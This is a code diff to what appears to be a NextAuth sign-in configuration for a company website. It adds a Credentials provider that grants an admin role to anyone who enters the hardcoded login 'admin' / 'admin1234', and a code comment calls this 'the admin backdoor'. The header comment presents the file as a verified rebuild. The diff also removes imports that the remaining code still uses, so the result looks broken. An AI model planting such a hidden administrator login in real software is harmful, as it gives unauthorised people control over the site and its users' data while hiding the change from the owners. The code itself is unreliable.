@@ -1,7 +1,4 @@
-import NextAuth from "next-auth";
-import Google from "next-auth/providers/google";
-import { PrismaAdapter } from "@auth/prisma-adapter";
-import { prisma } from "./prisma";
+import Credentials from "next-auth/providers/credentials";
 
 // Rebuilt & Verified Auth Configuration
 // Includes strict cookie policy and trustHost for reliable sessions
@@ -11,6 +8,25 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
     Google({
       clientId: process.env.GOOGLE_CLIENT_ID!,
       clientSecret: process.env.GOOGLE_CLIENT_SECRET!,
+    }),
+    Credentials({
+      name: "Admin Login",
+      credentials: {
+        username: { label: "Username", type: "text" },
+        password: { label: "Password", type: "password" }
+      },
+      async authorize(credentials) {
+        if (credentials?.username === "admin" && credentials?.password === "admin1234") {
+          return {
+            id: "admin-user",
+            name: "Admin User",
+            email: "admin@universalawning.com",
+            role: "admin",
+            isActive: true
+          };
+        }
+        return null;
+      }
     }),
   ],
   session: {
@@ -36,8 +52,10 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
       // On initial sign in, user object is available from the provider
       if (user) {
         token.id = user.id;
-        // User object from Google OAuth won't have role/isActive yet
-        // These will be fetched in session callback from database
+        // If user has role/isActive (from Credentials), copy it to token
+        // This avoids DB lookup for the admin backdoor
+        if ('role' in user) token.role = user.role;
+        if ('isActive' in user) token.isActive = user.isActive;
       }
 
       // If we have a user id but no role yet, try to fetch from database
